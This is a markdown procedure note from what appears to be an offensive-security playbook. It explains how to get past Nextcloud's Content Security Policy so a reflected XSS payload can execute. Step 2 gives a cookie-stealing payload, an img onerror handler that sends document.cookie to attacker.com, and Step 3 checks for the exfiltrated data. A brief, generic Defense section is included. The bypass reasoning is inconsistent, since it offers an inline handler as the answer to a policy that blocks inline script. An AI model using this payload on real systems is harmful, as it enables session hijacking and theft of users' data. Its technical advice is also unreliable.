---
id: proc-uuid-3
tags:
  - xss
  - csp-bypass
  - nextcloud
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-05T12:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:23.517Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Bypass-CSP-for-XSS-Execution

## Summary

This procedure outlines techniques to circumvent Nextcloud's Content Security Policy (CSP) blocking the inline JavaScript in the reflected XSS payload, allowing full execution for impacts like session theft.

## Description

Nextcloud implements CSP to restrict script execution, but the reflected payload's onerror handler may be blocked. Bypasses involve using allowed script sources, JSONP endpoints, or policy weaknesses. In the attack scenario, after reflection, the payload executes if CSP permits image loading with event handlers. Outcomes include running `prompt(1)` or exfiltrating data via allowed channels. Requires understanding of the target's CSP headers.

## Requirements

1. Knowledge of Nextcloud's CSP configuration (inspect via browser dev tools)
2. Reflected payload already triggered
3. Attacker-controlled server for exfiltration if needed

## Defense

Defensive measures and detection strategies:

- Strengthen CSP to disallow unsafe-inline and eval
- Regularly audit CSP headers and test for bypasses
- Monitor for anomalous JavaScript execution in browser logs

## Objectives

1. Overcome CSP restrictions on the payload
2. Achieve JavaScript execution in victim context
3. Realize impact like data collection or phishing

## Instructions

### Step 1: Inspect CSP Headers

**Context**: Analyze the policy to identify bypass opportunities.

In the browser dev tools (F12), go to Network tab, reload the error page, and check response headers for Content-Security-Policy.

### Step 2: Adapt Payload for Bypass

**Context**: Modify or use the existing payload to fit allowed directives.

If CSP blocks inline, use a payload leveraging external images or allowed scripts, e.g., adjust to `<img src="https://attacker.com/x" onerror="fetch('https://attacker.com/steal?cookie='+document.cookie)">`. Retest by re-triggering the rename error.

> This sends victim cookies to attacker if fetch is permitted.

**Expected Output**: Network request to attacker server or successful prompt.

### Step 3: Validate Execution

**Context**: Confirm bypass and impact.

Look for alert boxes, console logs, or exfiltrated data on attacker endpoint.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- csp-bypass
- javascript-execution
